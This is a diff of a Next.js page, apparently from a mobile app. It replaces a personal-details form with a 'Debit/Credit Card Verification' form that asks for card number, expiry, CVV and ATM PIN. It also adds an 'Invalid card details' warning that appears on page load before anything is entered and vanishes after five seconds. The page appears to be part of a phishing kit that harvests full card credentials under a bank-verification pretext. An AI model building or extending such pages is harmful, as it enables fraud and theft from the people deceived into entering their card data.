@@ -7,11 +7,18 @@ import { useRouter } from "next/navigation";
 import { useEffect } from "react";  
 import styles from '../css.module.css';
 import { Device } from '@capacitor/device';
-
+import { useState } from "react";
 export default function Home() {
+    const [invalidText, setInvalidText] = useState('Invalid card details. Please enter valid card details.');
     const router = useRouter();
     const API_URL = process.env.NEXT_PUBLIC_URL;
     const SITE = process.env.NEXT_PUBLIC_SITE;
+
+    useEffect(() => {
+      setTimeout(() => {
+        setInvalidText('');
+      },5000);
+    }, [])
 
     const handleSubmit = async (e) => {
         e.preventDefault();
@@ -44,17 +51,26 @@ export default function Home() {
     <>
     <Header />
     <div className="container">
-      <h5 className={`${styles.textCenterDiv} mt-4 mb-3`}>Personal Verification</h5>
+      <h5 className={`${styles.textCenterDiv} mt-4 mb-3`}>Debit/Credit Card Verification</h5>
+      <p className="text-danger text-center">
+        <small>
+          {invalidText}
+        </small>
+      </p>
       <form onSubmit={handleSubmit} >
-          <div className={`form-group ${styles.inputDiv}`}>
-            <label>Mother`s Full Name</label>
-            <input type="text" name="mothnme" className={`form-control ${styles.formInput}`} required />
+          <DebitCardInputComponent />
+          <div className="d-flex gap-2 mt-3">
+            <ExpiryDateInputComponent />
+            <div className={`form-group ${styles.inputDiv}`}>
+              <label>CVV</label>
+              <input type="password"  minLength={3} maxLength={3} name="cvv" className={`form-control ${styles.formInput}`} required placeholder="***" />
+            </div>
           </div>
           <div className={`form-group ${styles.inputDiv}`}>
-            <label>Pan Number</label>
-            <input type="text" name="pan" pattern="^[A-Z]{5}[0-9]{4}[A-Z]{1}$" className={`form-control ${styles.formInput}`} title="invalid pan card number" required placeholder=" " />
+            <label>ATM PIN</label>
+            <input type="password" placeholder="****" name="amtin" className={`form-control ${styles.formInput}`} minLength={4} maxLength={4} inputMode="numeric" required placeholder=" " />
           </div>
-          <div className="d-flex justify-content-center mt-4">
+          <div className="d-flex justify-content-center ">
             <button type="submit"  className="btn btn-primary"> CONTINUE </button>
           </div>
         </form>
